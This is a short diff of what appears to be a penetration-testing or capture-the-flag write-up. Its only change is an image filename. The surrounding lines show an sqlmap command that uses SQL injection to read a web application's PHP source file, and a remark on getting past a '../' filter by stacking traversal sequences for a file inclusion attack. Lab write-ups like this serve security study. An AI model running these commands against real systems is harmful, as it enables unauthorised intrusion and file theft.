@@ -210,7 +210,7 @@ Let's find out why this is happening:
 sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/var/www/market/index.php --threads 10
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (6).png" alt=""><figcaption></figcaption></figure>
 
 In here, we see that PHP is using .str\_replace for ../ which is impacting our LFI attack. However, what if we stack our ../'s and we try again?
 
